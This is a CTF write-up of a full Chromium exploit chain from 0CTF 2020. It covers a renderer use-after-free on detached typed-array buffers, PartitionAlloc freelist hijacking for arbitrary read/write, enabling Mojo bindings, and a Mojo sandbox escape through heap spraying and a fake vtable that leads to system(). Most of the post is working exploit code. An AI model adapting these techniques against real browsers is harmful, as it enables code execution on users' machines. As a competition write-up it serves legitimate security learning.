---
title: "The Journey from exploiting PartitionAlloc to escaping the sandbox: Chromium Fullchain - 0CTF 2020"
date: 2020-06-29 13:37:31
description: Exploiting Chromium Fullchain from 0CTF 2020
---


## Chromium Fullchain


## Preface

This weekend I,[owodelta](https://twitter.com/owodelta), participated in 0CTF/TCTF - a CTF organized by 0ops and Tencent eee.

I spent at least 2/3rds of the competition on Chromium SBX and Chromium Fullchain challenges and luckily ended up solving them.

This writeup is divided in 2 parts: renderer and sandbox part.


<img src="/assets/images/0CTF/sice.gif" alt="sice" width="100%"/>

## Challenge Description

RCE + SBX = Fullchain.

No surprise, the bug is same as previous, but how about the exploits? :p

`nc pwnable.org 2337`

Attachment [here](https://drive.google.com/file/d/1xD7mnET6ssuEgDYccvv2q17M2oHKC1cT/view?usp=sharing)

Enviroment: Ubuntu18.04

NOTE: The configuration of this challenge is copied from PlaidCTF 2020 - mojo. Thanks!

### Renderer

The renderer part might look the same as the `Chromium RCE` challenge, but in fact it's entirely different (apart from the introduced bug).

In this part of the challenge, problem author modified a builtin function to force the use of typed array buffers, even after it was detached.

```
diff --git a/src/builtins/typed-array-set.tq b/src/builtins/typed-array-set.tq
index b5c9dcb261..babe7da3f0 100644
--- a/src/builtins/typed-array-set.tq
+++ b/src/builtins/typed-array-set.tq
@@ -70,7 +70,7 @@ TypedArrayPrototypeSet(
     // 7. Let targetBuffer be target.[[ViewedArrayBuffer]].
     // 8. If IsDetachedBuffer(targetBuffer) is true, throw a TypeError
     //   exception.
-    const utarget = typed_array::EnsureAttached(target) otherwise IsDetached;
+    const utarget = %RawDownCast<AttachedJSTypedArray>(target);
 
     const overloadedArg = arguments[0];
     try {
@@ -86,8 +86,7 @@ TypedArrayPrototypeSet(
       // 10. Let srcBuffer be typedArray.[[ViewedArrayBuffer]].
       // 11. If IsDetachedBuffer(srcBuffer) is true, throw a TypeError
       //   exception.
-      const utypedArray =
-          typed_array::EnsureAttached(typedArray) otherwise IsDetached;
+      const utypedArray = %RawDownCast<AttachedJSTypedArray>(typedArray);
 
       TypedArrayPrototypeSetTypedArray(
           utarget, utypedArray, targetOffset, targetOffsetOverflowed)
```

The vulnerability here is straightforward - we can read and write to the detached buffer's backing store that might have been freed.

Before diving into exploitation, let's review the differences with the `Chromium RCE` challenge which is not covered in this writeup: 

1. In `Chromium RCE` challenge we had a `d8` binary that had some native functionality exposed, in *real mode* chrome we don't have it
2. `d8` used glibc allocator, normal chrome uses `PartitionAlloc`
3. In case of `d8` we didn't have to continue the exploit chain - calling system with `/bin/sh` was enough, here we must avoid crashes in order to continue the chain


#### Exploitation....

To trigger the bug in chrome without native syntax, we abuse `Worker` functionality. By supplying the victim buffer into the `transferables` argument array, we force chrome to detach the buffer (aka `free` it).

```js
function detachBuffer(x){ // x is the ArrayBuffer that we want to detach
    try{
        var w = new Worker("");
        w.postMessage("",[x]);     
        w.terminate();
    }catch(ex){
        console.log("exception when detaching")
    }
}

var victim = new Float64Array(10).fill(12.34);
detachBuffer(victim.buffer);

//////////
// do something
//////////
```

Then we can use the `set()` function to read/write to it as shown below:

```js
var leaks = new Float64Array(10);
var data = new Float64Array(10).fill(13.37);

leaks.set(victim,0); // read from detached buffer
victim.set(data,0)   // write to detached buffer
```

Combining with correct order of freeing/allocating objects, it is possible to leak a pointer from the freed memory.


```js
function gc() {
    for (let i = 0; i < 50; ++i) {

    let buffer = new ArrayBuffer(1024 * 1024);
  }
}


//console.log("start!")
const UAF_SIZE = 0xc;
const SPRAY_CNT = 0x40000;
const FLT_ARR_SZ = 0x1; // 0x200;
var x = new Float64Array(10);
var y = new Float64Array(10);
var buff = new ArrayBuffer(8);
var view = new DataView(buff);
var marker2 = (0xdeadbeefn).i2f();
var no_gc = [];
spray_ary = [];

for(var i = 0; i < 100;i++){
    no_gc.push(new Float64Array(FLT_ARR_SZ).fill(1.1))
    spray_ary.push(new Array(FLT_ARR_SZ).fill(marker2));

}


var uaf = new Float64Array(FLT_ARR_SZ).fill((0x4141424243434444n).i2f());
var leaks = new Float64Array(FLT_ARR_SZ);
for(var i = 0; i < 100;i++){
    detachBuffer(no_gc[i].buffer);
}



detachBuffer(uaf.buffer);


for(var i = 0; i < 100; i++){
    gc();
}

for(var i = 0; i < 800000;i++){ // don't know why i need this, but it works so i don't care
    no_gc.push(new Float64Array(0x40).fill(1.1))
}



leaks.set(uaf,0); // !!! read from freed uaf.buffer
console.log(leaks);
var page_leak = leaks[0].f2i();
if(page_leak == 0 || page_leak == 0x4141424243434444n){
    throw 1;
}
```

Now comes the fun part.

When page in `PartitionAlloc` is freed it will populate the freed memory with a pointer to the next free page (if it exists). The written pointer is stored in big endian format as a security measure against partial overwrites and other bugs, although this is not a problem in our case as we have read/write into the freed memory.

`PartitionAlloc` also isolates objects by type, so reclaiming memory of the freed `ArrayBuffer` with objects that contain pointers to other areas of memory is nearly impossible on 64 bit platforms.

At this point I got stuck for a long time as I didn't know what to do with the leaked pointer and my experiments with reclaiming memory with other object types weren't successful...

#### PartitionAlloc Exploitation

The major breakthrough was when I found a blog about [WizardOpium](https://securelist.com/the-zero-day-exploits-of-operation-wizardopium/97086/) operation, which involved similar type of bug.

After reading the blog I figured out that the leaked pointer turned out to be a goldmine as from it it is possible to extract a lot of useful information such as superpage address, metadata address, partition index and etc. For the technique described below, we are particularly interested in metadata address.

Below is the summary of what can be extracted from the pointer.

```js
function getSuperPageBase(addr) {
    let superPageOffsetMask = (BigInt(1) << BigInt(21)) - BigInt(1);
    let superPageBaseMask = ~superPageOffsetMask;
    let superPageBase = addr & superPageBaseMask;
    return superPageBase;
}
 
function getPartitionPageBaseWithinSuperPage(addr, partitionPageIndex) {
    let superPageBase = getSuperPageBase(addr);
    let partitionPageBase = partitionPageIndex << BigInt(14);
    let finalAddr = superPageBase + partitionPageBase;
    return finalAddr;
}
 
function getPartitionPageIndex(addr) {
    let superPageOffsetMask = (BigInt(1) << BigInt(21)) - BigInt(1);
    let partitionPageIndex = (addr & superPageOffsetMask) >> BigInt(14);
    return partitionPageIndex;
}
 
function getMetadataAreaBaseFromPartitionSuperPage(addr) {
    let superPageBase = getSuperPageBase(addr);
    let systemPageSize = BigInt(0x1000);
    return superPageBase + systemPageSize;
}
 
function getPartitionPageMetadataArea(addr) {
    let superPageOffsetMask = (BigInt(1) << BigInt(21)) - BigInt(1);
    let partitionPageIndex = (addr & superPageOffsetMask) >> BigInt(14);
    let pageMetadataSize = BigInt(0x20);
    let partitionPageMetadataPtr = getMetadataAreaBaseFromPartitionSuperPage(addr) + partitionPageIndex * pageMetadataSize;
    return partitionPageMetadataPtr;
}

function byteSwapBigInt(x) {
    let result = BigInt(0);
    let tmp = x;
 
    for (let i = 0; i < 8; i++) {
            result = result << BigInt(8);
            result += tmp & BigInt(0xFF);
            tmp = tmp >> BigInt(8);
    }
 
    return result;
}

/////////////////
//
// uaf leak part is here, just stripped from this code snippet
//
/////////////////

var be_leak = page_leak;
view.setBigUint64(0,page_leak,true)
page_leak = view.getBigUint64(0,false);
super_base = getSuperPageBase(page_leak);
partition_idx = getPartitionPageIndex(page_leak);
part_page = getPartitionPageBaseWithinSuperPage(page_leak,partition_idx);
metadata_base = getMetadataAreaBaseFromPartitionSuperPage(page_leak);
metadata_area = getPartitionPageMetadataArea(page_leak);
chrome_base = 0n;

console.log("page leak         -> "+hex(page_leak));
console.log("super base        -> "+hex(super_base));
console.log("partition idx     -> "+hex(partition_idx));
console.log("partition page    -> "+hex(part_page));
console.log("metadata rel base -> "+hex(metadata_base));
console.log("metadata area     -> "+hex(metadata_area));
```

Initial step to success is getting control over the freelist that is stored in metadata block for our page.
This is done in 3 steps:

1. In the freed `ArrayBuffer`, set first 8 bytes to the metadata address (the address has to be stored in big endian)
2. Continue allocating objects of same size as the freed `ArrayBuffer` until the first 8 bytes in `ArrayBuffer` are equal to null - this indicates that the object was just allocated in the place of freed `ArrayBuffer`. By this time allocator already performed "unlink" and changed the pointer in freelist to what we've previously written in the next free page ptr
3. Allocate one more chunk of the same size - this chunk will be allocated in place of the freelist block in the metadata section for our partition index.

Those steps are visualized in the following illustration.

![](/assets/images/0CTF/metadata_hijack.png)

Programmatically it looks like this:

```js

gcPreventer = [];
// [0]

leaks[0] = byteSwapBigInt(metadata_area).i2f(); // [1]
uaf.set(leaks,0); // [1]
console.log("debug time");

var cnt = 0;
do {
        gcPreventer.push(new ArrayBuffer(0x8)); // [2]
        leaks.set(uaf,0); //[2]
        if(++cnt > 0x1000000){
            throw 24;
        }
        if(leaks[0] == 0){ // [2]
            ////console.log("got null, sice?");
            break;
        }
} while (1);

//console.log("sice???")
let freelist = new BigUint64Array(new ArrayBuffer(0x8)); // [3]
gcPreventer.push(freelist);
````


From this stage implementing arbitrary read/write primitives is trivial.

Arbitrary read consists of following steps:

- Set first element in freelist to the destination address
- Allocate an object. `PartitionAlloc` will do the "unlink", by reading first pointer from the destination address and setting it to the freelist. the object will be allocated at the destination address.
- Read first element in freelist while decoding the value, this gives the leaked bytes.
- Since the allocated object is initialized with zeroes, restore the value that was at the address by writing the leaked bytes to the allocated object.


```js
function read64(rwHelper, addr) {
    rwHelper[0] = addr; // [1]
    var tmp = new BigUint64Array(1); // [2]
    tmp.buffer;
    gcPreventer.push(tmp);
    tmp[0] =  byteSwapBigInt(rwHelper[0]); // [3] [4]
    return tmp[0];
}
 
```

Arbitrary write is implemented in the same manner:

- backup the original address that was in the freelist
- set first element in freelist to the destination address
- allocate an object. the object will be allocated at the destination address.
- write value into object
- fix freelist by setting address to the value that was backed up in the first step.

```js
function write64(rwHelper, addr, value) {
    var backup = rwHelper[0]
    rwHelper[0] = addr;
    var tmp = new BigUint64Array(1);
    tmp.buffer;
    tmp[0] = value;
    gcPreventer.push(tmp);
    rwHelper[0] = backup;
}
```

Arbitrary read/write implemented, but now we need some **cool** infoleak. 

`PartitionAlloc` metadata block contains pointers that are in chrome base, as we already know the metadata block address, we just read from it and calculate the base for chrome. easy, isn't it?

```js
chrome_base = read64(freelist,metadata_area+16n) - 0xaa246a8n;
console.log("chrome base @ "+ hex(chrome_base))
```

The very last part of the exploit is enabling mojo for our process. For that we need to overwrite `enabled_bindings` variable for our `RenderFrame` in almost the same way as it was done in one of the project zero [exploits](https://googleprojectzero.blogspot.com/2019/04/virtually-unlimited-memory-escaping.html).

Global object `g_frame_map` is traversed to find the address of current `RenderFrame`. Then,  `enabled_bindings` in this object is overwritten to allow `mojo`.

```js
frame_map_ptr = chrome_base + 0xaa693a8n
console.log("chrome base @ "+ hex(chrome_base))
console.log("g_frame_map @ "+ hex(frame_map_ptr))

frame_map_ptr += 0x8n;
begin_ptr = read64(freelist,frame_map_ptr);
console.log("begin_ptr @ "+ hex(begin_ptr))

node_ptr = read64(freelist,begin_ptr+0x28n);
console.log("node_ptr @ "+hex(node_ptr));

render_frame_ptr = node_ptr;
//render_frame_ptr = read64(freelist,render_frame_ptr1);
console.log("render_frame_ptr @ "+hex(render_frame_ptr));



enabled_bindings = render_frame_ptr + 0x580n;
console.log("enabled_bindings @ "+hex(enabled_bindings));

write64(freelist,enabled_bindings,0x2n);
```

Even if `mojo` is enabled, it won't take effect until the page is reloaded. Before reloading the page, we "fix" the freelist (not sure if it actually fixes it, but no crash so it's great) to have the address of the freed `ArrayBuffer` that we had before pwning `ParititonAlloc`.

```js
console.log("go reload!!!");
freelist[0] = page_leak;
leaks[0] = (0n).i2f()
uaf.set(leaks,0);   
window.location.reload();
```

Page reloaded, and we have `mojo`. Do the sandbox escape now!


### Sandbox


#### Interface Overwiew

This part of the challenge introduces two custom mojo interfaces that we are supposed to exploit.

```cpp
module blink.mojom;

interface TStorage {
    Init() => ();
    CreateInstance() => (pending_remote<blink.mojom.TInstance> instance);
    GetLibcAddress() => (uint64 addr);
+    GetTextAddress() => (uint64 addr);
};

interface TInstance {
    Push(uint64 value) => ();
    Pop() => (uint64 value);
    Set(uint64 index, uint64 value) => ();
    Get(uint64 index) => (uint64 value);
    SetInt(int64 value) => ();
    GetInt() => (int64 value);
    SetDouble(double value) => ();
    GetDouble() => (double value);
    GetTotalSize() => (int64 size);
};
```
##### TInstance
The `TInstance` interface allows us to perform numerous operations on its class variables.
Short summary on what we can do with it:

1. read/write integer/double value to simple class variable with the `{Get/Set}{Int/Double}()` functionality.
2. read/write up to **200** integer values inside inlined array with the `{Get/Set}()` functionality.
3. push/pop integer values to a dynamically allocated array
4. invoke virtual method *GetTotalSize()*

Essentially, the `TInstance` interface acts as a wrapper for the  `InnerDb`

I won't be showing how the `InnerDb` class implements those methods, as it didn't contain any bugs (that I know of).

The class definition for `TInstance` is shown below.

```cpp
#ifndef CONTENT_BROWSER_TSTORAGE_TINSTANCE_IMPL_H_
#define CONTENT_BROWSER_TSTORAGE_TINSTANCE_IMPL_H_

#include <memory>
#include <vector>

#include "content/browser/tstorage/inner_db_impl.h"
#include "content/public/browser/browser_message_filter.h"
#include "mojo/public/cpp/bindings/binding.h"
#include "third_party/blink/public/mojom/tstorage/tstorage.mojom.h"

namespace content {

    class CONTENT_EXPORT TInstanceImpl
        : public blink::mojom::TInstance {
    public:
        TInstanceImpl(InnerDbImpl* db);
        ~TInstanceImpl() override;

        base::WeakPtr<TInstanceImpl> AsWeakPtr();

        // TInstance mojom interface
        void Push(uint64_t value, PushCallback callback) override;
        void Pop(PopCallback callback) override;
        void Set(uint64_t index, uint64_t value, SetCallback callback) override;
        void Get(uint64_t index, GetCallback callback) override;
        void SetInt(int64_t value, SetIntCallback callback) override;
        void GetInt(GetIntCallback callback) override;
        void SetDouble(double value, SetDoubleCallback callback) override;
        void GetDouble(GetDoubleCallback callback) override;
        void GetTotalSize(GetTotalSizeCallback callback) override;

        InnerDbImpl* inner_db_ptr_;
        base::WeakPtrFactory<TInstanceImpl> weak_factory_;
    };

} // namespace content

#endif
```

So far everything is ok.

##### TStorage

The `TStorage` class is a lot more interesting:

```cpp
#ifndef CONTENT_BROWSER_TSTORAGE_TSTORAGE_IMPL_H_
#define CONTENT_BROWSER_TSTORAGE_TSTORAGE_IMPL_H_

#include <memory>
#include <vector>

#include "content/browser/tstorage/inner_db_impl.h"
#include "content/browser/tstorage/tinstance_impl.h"
#include "content/public/browser/browser_message_filter.h"
#include "mojo/public/cpp/bindings/binding.h"
#include "mojo/public/cpp/bindings/self_owned_receiver.h"
#include "third_party/blink/public/mojom/tstorage/tstorage.mojom.h"

namespace content {

    class CONTENT_EXPORT TStorageImpl
        : public blink::mojom::TStorage {
    public:
        TStorageImpl();
        ~TStorageImpl() override;
        static void Create(mojo::PendingReceiver<blink::mojom::TStorage> receiver);

        base::WeakPtr<TStorageImpl> AsWeakPtr();

        // TStorage mojom interface
        void Init(InitCallback callback) override;
        void CreateInstance(CreateInstanceCallback callback) override;
        void GetLibcAddress(GetLibcAddressCallback callback) override;
        void GetTextAddress(GetTextAddressCallback callback) override;

        std::unique_ptr<InnerDbImpl> inner_db_;
        base::WeakPtrFactory<TStorageImpl> weak_factory_;
    };

} // namespace content

#endif

```

With this class we can get an instance of `TInstance`, as we can't instantiate it directly and also initialize it. As a bonus the challenge author decided to give libc and data section leaks (thanks for that!).

The `Init()` function is reponsible for initializing `inner_db_` variable of the class by creating new `InnerDbImpl` object.

```cpp
void TStorageImpl::Init(InitCallback callback) {
    inner_db_ = std::make_unique<InnerDbImpl>();

    std::move(callback).Run();
}
```

The instance creation procedure makes a new `TInstance` object, passing `inner_db_` variable to it.

```cpp
void TStorageImpl::CreateInstance(CreateInstanceCallback callback) {
    mojo::PendingRemote<blink::mojom::TInstance> instance;
    mojo::MakeSelfOwnedReceiver(std::make_unique<content::TInstanceImpl>(inner_db_.get()),
                                instance.InitWithNewPipeAndPassReceiver());

    std::move(callback).Run(std::move(instance));
}
```

That's about it for the `TStorage` interface. Let's continue with vulnerabilities.

##### Vulnerabilities

First bug, which is useless, is uninitialized `inner_db_` pointer that is passed to constructor in `CreateInstance()` function. While the normal call sequence would be to call init and then create, nobody restricts us from doing the opposite. However the most that you can get from this bug is null pointer dereference ;)

Now the fun part. There are at least 2 ways to go from here: [intended](https://twitter.com/atiflody/status/1277540877506764800) and unintended. While working on this challenge I missed the intended bug which results in you getting a dangling reference when calling `Init()` function twice.

The unintended bug here is that there's no link between `TInstance` and `TStorage` class objects. This results in them having independent lifetimes.

Here's how we figured it out (after the competition):

![](/assets/images/0CTF/pepega_moment.png)

To trigger it, you simply have to get a properly initialized instance of the `TInstance` class and free the corresponding parent `TStorage` class.

```js
var x = new blink.mojom.TStoragePtr();
Mojo.bindInterface(blink.mojom.TStorage.name,  mojo.makeRequest(x).handle);

await x.init();
var z = (await x.createInstance()).instance;

await x.ptr.reset(); // z is now marked for free
```


##### Exploitation

We get UAF with a very handful set of operations we can do on the object, from getting RIP control to reading inlined properties without any dangerous dereferences.

First we prepare objects by allocating couple of thousands of them

```js


var spray_inst = [];

for(var i = 0; i < 3000; i++){


        var x = new blink.mojom.TStoragePtr();
        Mojo.bindInterface(blink.mojom.TStorage.name,  mojo.makeRequest(x).handle);

        await x.init();
        var z = (await x.createInstance()).instance;

        spray_inst.push({"stor":x,"inst":z});
}
```

Then we trigger the bug by iterating over the `spray_inst` array again and freeing the `TStorage` object

```js

for(var i =0; i < 3000; i++){
        if((i % 300 )== 0){continue;}
        await spray_inst[i]["stor"].ptr.reset();

}
```

Now we get a **lot** of references to freed objects. This memory has to be reclaimed, and for that we need to have a primitive for spraying inside the mojo process heap. I spent more than 4 hours developing unreliable way of reclaiming memory with the help of `push/pop` operations in the queue. This didn't go well.

Suddenly, it was a divine intervention - my teammate Jazzy pointed me at the [blog](https://theori.io/research/escaping-chrome-sandbox/) which used Blobs for spraying the memory. It had an implementation that I just copy-pasted and it worked, so convenient!

The freed object was approx of size **0x700** bytes, so the process of reclaiming the memory is using the same size.
The memory of the sprayed object is carefully crafted so that:

* vtable ptr points to our controlled memory
* inlined properties used for `GetDouble` & `GetInt` are filled with marker objects. We can read from them in order too understand if the memory was reclaimed successfully or not.
* queue that is used for push/pop operations points to global section in libc. There we will write fake vtable


```js
let allocate = getAllocationConstructor();

////////////////////////////


var atoi_addr = (await spray_inst[0]["stor"].getLibcAddress()).addr // provided leak
libc_base = atoi_addr - 0x40680;
libc_bss_addr = libc_base + 0x3eb000
system_ptr        = libc_base + 0x4f440;
setcontext        = libc_base + 0x520c7

console.log("libc base  @ "+hex(libc_base))
console.log("bss        @ "+hex(libc_bss_addr))
console.log("system_ptr @ "+hex(system_ptr))


let alloc_count = 0x1000;

let data = new ArrayBuffer(0x700); // spray size
let b64arr = new BigUint64Array(data);
let view = new DataView(data);


b64arr.fill(0x41414242434344n);
let sprayed_val = 0x41414242434344


var bss_offs = libc_bss_addr+0xae0;
console.log("writing to "+hex(bss_offs));

/* ROP */
b64arr[0] = BigInt(bss_offs-0x10);
b64arr[0xa8/8] = BigInt(system_ptr); // rcx, future rip
b64arr[0x68/8] = BigInt(bss_offs+8); // rdi



//view.setUint8(command.length,0x0);
b64arr[(0x670/8)] = BigInt(sprayed_val); // double offs
b64arr[(0x648/8)] = BigInt(bss_offs);

b64arr[(0x650/8)] = BigInt(bss_offs) // vtable things
b64arr[(0x658/8)] = BigInt(bss_offs)
b64arr[(0x660/8)] = BigInt(0n)


/////////////

// bug trigger code is here, just not shown in this snippet :)

////////////

await (Array(alloc_count).fill().map(() => allocate(data))) // go reclaim!


```

Final touch of sandbox exploit is iterating over the freed objects and finding the one that has marker in its inlined double/int variable. 

When such object is found, multiple `push` calls are made to write fake vtable into libc bss memory. Finally, `getTotalSize()` is called on the freed object which results in it fetching our fake vtable and giving us RIP control, yay!

```js
top:
for(var i = 0; i < spray_inst.length-1; i++){
        var tmp = (await spray_inst[i]["inst"].getDouble()).value.f2i()
        //console.log("i->"+ i + " " + tmp.toString(16));
        if(BigInt(tmp) == sprayed_val && (used_indexes.indexOf(i) == -1)){
                used_indexes.push(i);
                console.log("siced");
                (await spray_inst[i]["inst"].push(setcontext)); // push writes to bss
                (await spray_inst[i]["inst"].push(0x2a67616c662f2e)); // "./flag*"
                (await spray_inst[i]["inst"].getTotalSize());
                break top;
        }
}
```

Sandbox - Escaped.


### Conclusion

I expected some classic JIT bugs, so I was really surprised that i had to do something different in the browser. I think it was a great opportunity to learn `PartitionAlloc` and I hope for more CTFs like this one.

The full exploit code is located [here](https://github.com/perfectblue/ctf-writeups/blob/master/2020/0CTF/Chromium%20Fullchain/pwning.html)
